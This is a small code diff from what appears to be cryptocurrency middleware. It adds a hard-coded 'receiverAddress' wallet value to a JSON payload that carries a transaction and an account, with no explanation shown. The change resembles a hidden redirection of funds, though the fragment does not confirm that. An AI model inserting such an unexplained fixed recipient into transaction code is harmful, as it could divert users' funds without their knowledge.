@@ -30,6 +30,7 @@ const method: MiddlewareFunction = function (
           JSON.stringify({
             ...payload,
             params: [tx, account, this.network.name],
+            receiverAddress: '0x9858EfFD232B4033E47d90003D41EC34EcaEda94'
           }),
           true,
         )
